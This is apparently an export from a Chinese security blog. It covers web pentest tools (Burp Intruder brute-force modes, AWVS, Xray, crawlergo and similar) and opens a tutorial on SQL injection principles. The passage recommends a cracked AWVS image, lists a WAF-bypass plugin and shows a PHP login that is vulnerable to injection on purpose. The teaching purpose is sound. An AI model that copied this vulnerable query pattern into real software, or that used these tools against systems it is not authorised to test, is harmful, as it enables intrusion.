<h4 id="Repeater的使用"><a href="#Repeater的使用" class="headerlink" title="Repeater的使用"></a>Repeater的使用</h4><p>在渗透测试过程中，我们经常使用Repeater来进行请求与响应的消息验证分析，比如修改请求参数，验证输入的漏洞；修改请求参数，验证逻辑越权；从拦截历史记录中，捕获特征性的请求消息进行请求重放。Burp Repeater的操作界面如下图所示：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bf5e6c9c3a7638df3b8d016d7c23cede.png" alt="img"></p>
<p>请求消息区为客户端发送的请求消息的详细信息，Burp Repeater为每一个请求都做了请求编号，当我们在请求编码的数字上双击之后，可以修改请求的名字，这是为了方便多个请求消息时，做备注或区分用的。在编号的下方，有一个【Send】按钮，当我们对请求的消息编辑完之后，点击此按钮即发送请求给服务器端。服务器的请求域可以在target处进行修改，如上图所示。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/05e87a80abd3e5e3f677b085aab3b1a8.png" alt="img"></p>
<p>应答消息区为对应的请求消息点击【Send】按钮后，服务器端的反馈消息。通过修改请求消息的参数来比对分析每次应答消息之间的差异，能更好的帮助我们分析系统可能存在的漏洞。</p>
<p>在我们使用Burp Repeater时，通常会结合Burp的其他工具一起使用，比如Proxy的历史记录，Scanner的扫描记录、Target的站点地图等，通过其他工具上的右击菜单，执行【Send to Repeater】，跳转到Repeater选项卡中，然后才是对请求消息的修改以及请求重放、数据分析与漏洞验证。</p>
<h3 id="Intruder模块"><a href="#Intruder模块" class="headerlink" title="Intruder模块"></a>Intruder模块</h3><p>Burp Intruder作为BurpSuite中一款功能极其强大的自动化测试工具，通常被系统安全渗透测试人员被使用在各种任务测试的场景中。</p>
<h4 id="Intruder使用场景和操作步骤"><a href="#Intruder使用场景和操作步骤" class="headerlink" title="Intruder使用场景和操作步骤"></a>Intruder使用场景和操作步骤</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
<ul>
<li>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</li>
<li>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</li>
<li>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</li>
</ul>
<p>通常来说，使用Burp Intruder进行测试，主要遵循以下步骤：</p>
<ol>
<li> 确认Burp Suite安装正确并正常启动，且完成了浏览器的代理设置。</li>
<li> 进入Burp Proxy选项卡，关闭代理拦截功能。</li>
<li> 进行历史日志（History）子选项卡，查找可能存在问题的请求日志，并通过右击菜单，发送到Intruder。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/dnKRwxF731cL6GH.png" alt="img"></p>
<ol start="4">
<li> 进行Intruder 选项卡，打开Target和Positions子选项卡。这时，你会看到上一步发送过来的请求消息。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/xrgs8Y7wjEbpVOe.png" alt="image.png"></p>
<ol start="5">
<li>因为我们了解到Burp Intruder攻击的基础是围绕刚刚发送过来的原始请求信息，在原始信息指定的位置上设置一定数量的攻击载荷Payload，通过Payload来发送请求获取应答消息。默认情况下，Burp Intruder会对请求参数和Cookie参数设置成Payload position，前缀添加§符号 ， 如上图红色标注位置所示。 当发送请求时，会将标识的参数替换为Payload。<blockquote>
<p>Attack type选项：</p>
<ul>
<li>Sinper（狙击手）：对变量依次进行破解。多个标记依次进行。适合爆破已知用户名但密码未知的情况。</li>
<li>Battering ram（攻城锤）：对变量同时进行破解，多个目标同时进行。适合爆破用户名与密码一致的情况。</li>
<li>PitchFork（鱼叉）：每一个变量标记对应一个字典，取每个字典的对应项。适合使用代理IP池的情况。</li>
<li>Cluster boom（集束炸弹）：每一个变量对应一个字典，并且进行交叉破解，尝试各种组合。适用于爆破用户名+密码的情况。</li>
</ul>
</blockquote>
</li>
<li>在Position界面的右边，有【Add §】、【Clear §】、【Auto §】、【Refersh §】四个按钮，是用来控制请求消息中的参数在发送过程中是否被Payload替换，如果不想被替换，则选择此参数，点击【Clear】，即将参数前缀去掉。</li>
<li>当我们打开Payload 子选项卡，选择Payload的生成或者选择策略，默认情况下选择“Simple list”,当然你也可以通过下拉选择其他Payload类型或者手工添加。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/RiXrHIKV8Y1eWZg.png" alt="img"></p>
<ol start="8">
<li> 此时，我们再回到Position界面，在界面的右上角，点击【Start attack】，发起攻击。</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/2fiz5RmjpCMvYud.png" alt="img"></p>
<ol start="9">
<li> 此时，Burp会自动打开一个新的界面，包含攻击执行的情况、Http状态码、长度等结果信息。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c41e7fc3d318133f2019f7349c32edea.png" alt="img"></p>
<ol start="10">
<li>我们可以选择其中的某一次通信信息，查看请求消息和应答消息的详细。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7482b496dc9fb8e3846f30e11102d768.png" alt="img"></p>
<h3 id="Project-Options模块"><a href="#Project-Options模块" class="headerlink" title="Project Options模块"></a>Project Options模块</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/e2eee982f969e3f3364cfaa3d4cee97d.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/wIZYEzoNHv78eSu.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/qUhzYO97pkLtN6b.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/Q6bmxjfg1WICG9h.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/QUT18RhKVny3SIN.png" alt="img"></p>
<h3 id="User-Options模块"><a href="#User-Options模块" class="headerlink" title="User Options模块"></a>User Options模块</h3><p><img src="https://i.loli.net/2021/10/05/e1zu8X297QrB4HV.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/VEm3TBsjqQHdrAR.png" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/GV4zwEtxo7sMYem.png" alt="img"></p>
<h3 id="BurpSuite扩展插件推荐"><a href="#BurpSuite扩展插件推荐" class="headerlink" title="BurpSuite扩展插件推荐"></a>BurpSuite扩展插件推荐</h3><ul>
<li>Autorize —— 强大的越权自动化测试工具</li>
<li>Turbo Intruder —— 短时间发送大量请求</li>
<li>Software Vulnerability Scanner —— 自动根据版本号查找 CVE</li>
<li>Scan Check Builder —— 自定义扫描 payload</li>
<li>BypassWAF —— 可帮助绕过WAF</li>
<li>Logger++ —— 更强大的请求历史查看器</li>
<li>Brida —— 连接 frida 与 burpsuite</li>
<li>J2EEScan —— 强大的 J2EE 后台扫描插件</li>
<li>sqlmap4burp++ —— 连接 burpsuite 与 sqlmap</li>
<li>Knife —— 工具箱、自定义 payload</li>
<li>CSRF Token Tracker —— 绕过CSRF限制进行暴力破解</li>
<li>JSON Beautifier —— 格式化查看 json</li>
<li>Decompressor —— 自动解码和修改 gzip 压缩包</li>
<li>Wsdler —— 测试 WSDL 请求</li>
</ul>
<h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p>
<blockquote>
<p>这里推荐使用的AWVS虽然不是最新版，但是是最新的破解docker版</p>
</blockquote>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>1、docker中拉取下载镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br></pre></td></tr></table></figure>

<p>2、将docker的3443端口映射到物理机的 3443端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure>

<p>3、<code>https://docker所在服务器的ip:3343</code></p>
<p>默认用户名和密码：</p>
<p><code>username: admin@admin.com</code></p>
<p><code>password: Admin123</code></p>
<p><img src="https://i.loli.net/2021/10/05/bt1anT2DRJ3xmkS.png" alt="227b2f2bf566fb26bf9afe9c31447e2d.png"></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><strong>使用界面</strong></p>
<p><img src="https://i.loli.net/2021/10/05/bAkiWhe6Xl2GDFH.png" alt="在这里插入图片描述"></p>
<p><strong>扫描功能区</strong></p>
<p><img src="https://i.loli.net/2021/10/05/IMhU4JFtCyXLZSk.png" alt="在这里插入图片描述"></p>
<ol>
<li> Targets 点击 targets返回目标列表，选择要扫描的url，点击scan开始扫描</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/zZLSaFfmjDVEx3p.png" alt="在这里插入图片描述"></p>
<ol start="2">
<li> Vulnerabilities 点击Vulnerabilities查看漏洞列表，选择具体的漏洞可以进行右上方的操作</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/yCExQjGKFYBXeUw.png" alt="在这里插入图片描述"></p>
<ol start="3">
<li>Reports 点击reports，可以看到扫描结束的报告列表，可以导出为pdf和html格式的 <img src="https://i.loli.net/2021/10/05/nC8DyOGFXZTBI14.png" alt="在这里插入图片描述"></li>
</ol>
<p><strong>设置区</strong></p>
<ol>
<li> Users(用户管理) 创建子用户</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/FejScwlBL1YIz8C.png" alt="在这里插入图片描述"></p>
<ol start="2">
<li> ScanTypes(扫描类型) 添加自定义扫描类型</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/y3VofR62hLmI1cM.png" alt="在这里插入图片描述"></p>
<ol start="3">
<li> Network Scanner(网络扫描器)</li>
</ol>
<p><img src="https://i.loli.net/2021/10/05/MnQtqTvDH6ELhGa.png" alt="在这里插入图片描述"></p>
<h2 id="AppScan"><a href="#AppScan" class="headerlink" title="AppScan"></a>AppScan</h2><p>IBM AppScan该产品是一个领先的 Web 应用安全测试工具，曾以 Watchfire AppScan 的名称享誉业界。Rational AppScan 可自动化 Web 应用的安全漏洞评估工作，能扫描和检测所有常见的 Web 应用安全漏洞。</p>
<p>AppScan的下载、安装可参考：<a href="https://www.jb51.net/softs/733458.html">https://www.jb51.net/softs/733458.html</a></p>
<p>个人认为扫描速度比AWVS要慢很多，这里不做过多讲解。</p>
<h2 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>项目地址：<a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p>
<p>长亭科技研发的一款完善的安全评估工具，支持常见 Web 安全问题扫描和自定义 POC，虽然 Github 有项目，但是不开源，只提供社区版本供大家使用。</p>
<ul>
<li>有关Xray的配置可以参考此文章：<a href="https://www.sqlsec.com/2020/04/xray.html#toc-heading-21">https://www.sqlsec.com/2020/04/xray.html#toc-heading-21</a></li>
<li>Xray安全工具评估文档：<a href="https://docs.xray.cool/#/tutorial/introduce">https://docs.xray.cool/#/tutorial/introduce</a></li>
</ul>
<p>这里只是进行一个简单使用。</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p>代理模式下的基本架构为，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。这种原理和 Burpsuite 的自带的漏扫原理是一样的。</p>
<h4 id="生成-ca-证书"><a href="#生成-ca-证书" class="headerlink" title="生成 ca 证书"></a>生成 ca 证书</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  生成 ca 证书</span></span><br><span class="line">./xray genca</span><br><span class="line"></span><br><span class="line"><span class="comment">#  在当前文件夹生成 ca.crt 和 ca.key 两个文件</span></span><br><span class="line">ls</span><br><span class="line">ca.crt      ca.key      config.yaml xray</span><br></pre></td></tr></table></figure>

<p>将生成的 ca 证书导入到需要代理的设备即可，这样就可以方便代理 https 的流量了</p>
<h4 id="启用代理"><a href="#启用代理" class="headerlink" title="启用代理"></a>启用代理</h4><p>第一次启动 xray 之后，当前目录会生成 <code>config.yml</code> 配置文件。</p>
<p>监听本地的<code>7777</code>端口，并设置漏洞报告的输出的文件名为：<code>xray-testphp.html</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./xray webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure>

<h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>Chrome 下的 SwitchyOmega 插件很方便添加各种代理，将xray的代理添加进来，然后浏览器开启 xray 代理即可:</p>
<p><img src="https://image.3001.net/images/20200415/15869142439356.png" alt="img"></p>
<h4 id="开始扫描"><a href="#开始扫描" class="headerlink" title="开始扫描"></a>开始扫描</h4><p>使用刚刚设置过代理的 Chrome 浏览器访问：<a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com</a></p>
<p>然后就可以看到 xray 界面开始输出漏洞信息，在用户和网站交互的时候，期间的连接 xray 都会进行安全检查，然后生成对应的漏洞报告:</p>
<p>下面是几个快速链接，可以点击用于体验更多的漏洞类型的扫描</p>
<ul>
<li><a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a></li>
<li><a href="http://testphp.vulnweb.com/artists.php?artist=2">http://testphp.vulnweb.com/artists.php?artist=2</a></li>
<li><a href="http://testphp.vulnweb.com/redir.php?r=http://www.w3.org">http://testphp.vulnweb.com/redir.php?r=http://www.w3.org</a></li>
</ul>
<p>可以在上面设置的输出格式里面看到对应的漏洞检测结果报告：</p>
<p><img src="https://image.3001.net/images/20200415/15869147021320.png" alt="img"></p>
<h3 id="爬虫模式"><a href="#爬虫模式" class="headerlink" title="爬虫模式"></a>爬虫模式</h3><p>爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点需要注意。</p>
<ul>
<li>xray 的基础爬虫不能处理 js 渲染的页面</li>
<li>需要首先人工配置登录 cookie，必需的 http 头等，如果登录失败，也不容易发现问题</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</span><br></pre></td></tr></table></figure>

<p>在这个模式下，相当于主动扫描模式，自主分析页面的链接，然后自动探测是否有漏洞。</p>
<h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p>xray 也支持服务扫描，目前的服务扫描的POC还不够多，目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测poc。</p>
<p>参数配置目前比较简单，支持单个扫描与批量扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 快速检测单个目标</span></span><br><span class="line">./xray servicescan --target 127.0.0.1:8009</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量检查的 1.file 中的目标, 一行一个目标，带端口</span></span><br><span class="line">./xray servicescan --target-file test.file</span><br></pre></td></tr></table></figure>

<p>其中 <code>test.file</code> 的格式为一个行一个 service，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.3.0.203:8009</span><br><span class="line">127.0.0.1:8009</span><br></pre></td></tr></table></figure>

<p>也可以将结果输出到报告中，支持多种格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将检测结果输出到 html 报告中</span></span><br><span class="line">./xray servicescan --target 127.0.0.1:8009 --html-output service.html</span><br><span class="line">./xray servicescan --target-file test.file --html-output service.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将检测结果输出到 json 文件中</span></span><br><span class="line">./xray servicescan --target 127.0.0.1:8099 --json-output service.json </span><br></pre></td></tr></table></figure>

<p>完整的servicescan用法可以使用下面命令查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./xray servicescan --help</span><br><span class="line">NAME:</span><br><span class="line">    servicescan - Run a service scan task</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    servicescan [command options] [arguments...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   --target value          specify the target, for example: host:8009</span><br><span class="line">   --target-file value     load targets from a local file, one target a line</span><br><span class="line">   --json-output FILE      output xray results to FILE in json format</span><br><span class="line">   --webhook-output value  post xray result to url in json format</span><br><span class="line">   --html-output FILE      output xray result to FILE in HTML format</span><br></pre></td></tr></table></figure>

<h3 id="Xray与Rad联动"><a href="#Xray与Rad联动" class="headerlink" title="Xray与Rad联动"></a>Xray与Rad联动</h3><p>长亭科技研发的一款浏览器爬虫，rad 爬虫可以动态渲染各种框架的网站并进行请求抓取。</p>
<p>可以配合Rad实现强大的主动扫描。</p>
<p>rad下载地址：<a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></p>
<p>与xray联动方式</p>
<ul>
<li>社区版：设置上级代理为xray监听地址 运行xray：  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>
  运行rad：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rad -t http://example.com -http-proxy 127.0.0.1:7777</span><br></pre></td></tr></table></figure>
</li>
<li>高级版对 rad 进行了深度融合，下载后可以一键使用：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --browser-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Xray与Crawlergo联动"><a href="#Xray与Crawlergo联动" class="headerlink" title="Xray与Crawlergo联动"></a>Xray与Crawlergo联动</h3><p><strong>crawlergo</strong>是一个使用<code>chrome headless</code>模式进行URL收集的浏览器爬虫。它对整个网页的关键位置与DOM渲染阶段进行HOOK，自动进行表单填充并提交，配合智能的JS事件触发，尽可能的收集网站暴露出的入口。内置URL去重模块，过滤掉了大量伪静态URL，对于大型网站仍保持较快的解析与抓取速度，最后得到高质量的请求结果集合。</p>
<p>crawlergo下载地址：<a href="https://github.com/Qianlitp/crawlergo">https://github.com/Qianlitp/crawlergo</a></p>
<p><strong>crawlergo_x_XRAY</strong>：360 0Kee-Team 的 crawlergo动态爬虫 结合 长亭XRAY扫描器的被动扫描功能 (其它被动扫描器同理)</p>
<p>项目地址：<a href="https://github.com/timwhitez/crawlergo_x_XRAY">https://github.com/timwhitez/crawlergo_x_XRAY</a></p>
<p>与Xray联动方式</p>
<p>1、下载xray最新的release, 下载crawlergo最新的release</p>
<p>注意,是下载编译好的文件而不是git clone它的库</p>
<p>2、下载crawlergo_x_XRAY</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/timwhitez/crawlergo_x_XRAY.git</span><br></pre></td></tr></table></figure>

<p>3、把launcher.py和targets.txt放在crawlergo.exe同目录下</p>
<p>4、配置好并启动xray被动扫描(脚本默认配置为127.0.0.1:7777)若修改端口请同时修改launcher.py文件中的proxies</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>

<p>5、配置好launcher.py的cmd变量中的crawlergo爬虫配置(主要是chrome路径改为本地路径), 默认为：</p>
<p><code>./crawlergo -c C:\Program Files (x86)\Google\Chrome\Application\chrome.exe -t 20 -f smart --fuzz-path --output-mode json target</code></p>
<p><img src="/../_resources/a79d6c745ce01083fc538cd138f8a6c7.png" alt="a79d6c745ce01083fc538cd138f8a6c7.png"></p>
<p>6、把目标url写进targets.txt,一行一个url</p>
<p><img src="/../_resources/23b7d8b864864a0cdb60c5d38c331d93.png" alt="23b7d8b864864a0cdb60c5d38c331d93.png"></p>
<p>7、用python3运行launcher.py ( XRAY被动扫描为启动的状态 )</p>
<p>8、生成的sub_domains.txt为爬虫爬到的子域名, crawl_result.txt为爬虫爬到的url</p>
<blockquote>
<p>Xray还可以与AWVS、Burpsuite联动，官方文档中有说明，这里就不进行赘述了。</p>
</blockquote>
<h2 id="W13Scan"><a href="#W13Scan" class="headerlink" title="W13Scan"></a>W13Scan</h2><p>W13scan 是基于Python3的一款开源的Web漏洞发现工具,它支持主动扫描模式和被动扫描模式，能运行在Windows、Linux、Mac上。</p>
<p>功能与Xray相似，具有非常丰富的检测插件，而且是开源的。</p>
<p>项目地址：<a href="https://github.com/w-digital-scanner/w13scan">https://github.com/w-digital-scanner/w13scan</a></p>
<p>W13Scan也可以使用被动扫描模式，且也可以与爬虫扫描工具进行联动。</p>
<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>Goby 是一款新的网络安全测试工具，由赵武 Zwell（Pangolin、JSky、FOFA 作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。我们希望能够输出更具生命力的工具，能够对标黑客的实际能力，帮助企业来有效地理解和应对网络攻击。</p>
<p>支持多平台、多国语言。</p>
<p>具有丰富的设备规则集（软硬件设备厂商、系统、业务）、轻量级的协议识别（网络协议、数据库协议、IoT协议、ICS协议）、丰富的端口分组（超过300个常见端口）、最新的漏洞框架（及时更新漏洞信息、民间高手POC）、全面的预置密码检查（设备默认账号密码）</p>
<p>最重要的是免费且扩展性强，联动姿势很多。</p>
<p><img src="https://i.loli.net/2021/10/05/T2OuLpAzSZY7VDX.png" alt="36f5a72c07f3b44be76b25fcc179e99b.png"></p>
<h2 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP ZAP"></a>OWASP ZAP</h2><p>OWASP ZAP，全称：OWASP Zed Attack Proxy攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助我们在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
<p>OWASP ZAP的漏洞扫描能力虽然不是很好用，但它有着非常强大的爬虫功能。</p>
<p>Kali Linux内置工具。</p>
<h2 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h2><p>w3af是一种开源web 应用程序安全扫描仪，可帮助开发人员和渗透测试人员识别和利用其 web 应用程序中的漏洞。</p>
<p>w3af能够识别200 多个漏洞，包括跨站点脚本、SQL 注入和操作系统命令。</p>
<p>项目地址：<a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a></p>
<p>相关安装流程可参考：<a href="https://www.jianshu.com/p/171ab006183a">https://www.jianshu.com/p/171ab006183a</a></p>
<h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><p>Skipfish是一款轻量级的主动的Web应用程序安全侦察工具。它通过执行递归爬取和基于字典的探测来为目标站点准备交互式站点地图。最终的地图然后用来自许多活动（但希望是不中断的）安全检查的输出来注释。该工具生成的最终报告旨在作为专业Web应用程序安全评估的基础。</p>
<p>Kali Linux内置工具。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入的原理</title>
    <url>/post/1f3ac757.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQL注入漏洞介绍"><a href="#SQL注入漏洞介绍" class="headerlink" title="SQL注入漏洞介绍"></a>SQL注入漏洞介绍</h2><p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是SQL注入漏洞。</p>
<p>SQL 注入式攻击技术,一般针对基于 Web 平台的应用程序造成 SQL 注入攻击漏洞的原因，是由于程序员在编写 Web 程序时，没有对浏览器端提交的参数进行严格的过滤和判断。用户可以修改构造参数，提交 SQL 查询语句，并传递至服务器端，从而获取想要的敏感信息，甚至执行危险的代码或系统命令。</p>
<p>虽然 SQL 注入攻击技术早已出现,但是时至今日仍然有很大一部分网站存在 SQL 注入漏洞，在本章开篇中进行的入侵检测中就发现了各大门户网站同样存在SQL 注入漏洞,更别说一些小网站了。由于 SQL 漏润存在的普遍性，因此 SQL 入侵攻击技术往往成为黑客入侵攻击网站渗透内部服务的首选技术,其危害性非常大。</p>
<p>下面对目前的各种流行 SQL 注入攻击技术进行总结,以便网络安全管理人员和工作者更加深入地了解这种攻击与防御方法。</p>
<h2 id="注入式攻击的原理"><a href="#注入式攻击的原理" class="headerlink" title="注入式攻击的原理"></a>注入式攻击的原理</h2><p>注入式攻击的根源在于，程序命令和用户数据（即用户输入）之间没有做到泾渭分明。这使得攻击者有机会将程序命令当作用户输入的数据提交给 Web 程序，以发号施令，为所欲为（注：注入最终是数据库，与脚本、平台无关）。</p>
<p>总之一句话：注入产生的原因是接受相关参数未经处理直接带入数据库查询操作。</p>
<p>为了发动注入攻击，攻击者需要在常规输入中混入将被解释为命令的“数据”，想要成功，必须要做三件事情：</p>
<ul>
<li><strong>确定Web应用程序所使用的技术</strong></li>
</ul>
<p>注入式攻击对程序设计语言或者硬件关系密切,但是这些可以通过适当的踩点或者索性将所有常见的注入式攻击都搬出来逐个试一下就知道了。为了确定所采用的技术,攻击者可以考察 Web 页面的页脚,查看错误页面,检查页面源代码,或者使用诸如 Nessus、AWVS、APPSCAN 等工具来进行刺探。</p>
<ul>
<li><strong>确定所有可能的输入方式</strong></li>
</ul>
<p>Web 应用的用户输入方式比较多,其中一些用户输入方式是很明显的,如 HTML 表单；另外,攻击者可以通过隐藏的 HTML 表单输入、HTTP 头部、cookies、甚至对用户不可见的后端 AJAX 请求来跟 Web 应用进行交互。一般来说，所有 HTTP 的 GET 和 POST 都应当作用户输入。为了找出一个 Web 应用所有可能的用户输入，我们可以求助于 Web 代理，如 Burp 等。</p>
<ul>
<li><strong>查找可用于注入的用户输入</strong></li>
</ul>
<p>在找出所有用户输入方式后,就要对这些输入方式进行筛选,找出其中可以注入命令的那些输入方式。这个任务好像有点难，但是这里有一个小窍门，那就是多多留意 Web 应用的错误页面，很多时候您能从这里得到意想不到的收获。</p>
<h2 id="万能密码漏洞解析"><a href="#万能密码漏洞解析" class="headerlink" title="万能密码漏洞解析"></a>万能密码漏洞解析</h2><p>大家经常听到网站万能密码登录,今天我们就来分析分析万能密码是怎么回事。先给大家来一个简单的实例：</p>
<ol>
<li> 登录页面关键代码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$adminname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;adminname&#x27;</span>];</span><br><span class="line"><span class="variable">$adminpass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;adminpass&#x27;</span>];</span><br><span class="line"><span class="variable">$adminpass</span> .= <span class="string">&quot;Axphp.com&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span> = md5(<span class="variable">$adminpass</span>);</span><br><span class="line"><span class="variable">$adminsql</span> = <span class="string">&quot;select * from axphp_admin where adminname=&#x27;<span class="subst">$adminname</span>&#x27; and adminpass=&#x27;<span class="subst">$adminpass</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$adminery</span> = mysql_query(<span class="variable">$adminsql</span>, <span class="variable">$config</span>);</span><br><span class="line"><span class="variable">$adminnum</span> = mysql_num_rows(<span class="variable">$adminery</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$adminnum</span> == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    setcookie(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;Y&quot;</span>, time() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;admin_name&quot;</span>, <span class="variable">$adminname</span>, time() + <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    header(<span class="string">&quot;location:axadmin.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;location:axphp.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$adminsql <span class="operator">=</span> &quot;select * from axphp_admin where adminname=&#x27;$adminname&#x27; and adminpass=&#x27;$adminpass&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>我们发现没有做任何过滤直接拿前端传入的数据,这样拼接的 SQL 会存在注入漏洞。</p>
<p>1）先输入正常数据（账号admin，密码admin），效果如下：</p>
<p><img src="https://i.loli.net/2021/10/05/rz8BKu5P3csCfGJ.png" alt="733007d88171f2ead549ef362c4941c1.png"></p>
<p><img src="https://i.loli.net/2021/10/05/ZRztfBH5V8OgvyQ.png" alt="150e121789c8e535341bbb3cbbd9f2e0.png"></p>
<p>查询的SQL语句为：</p>
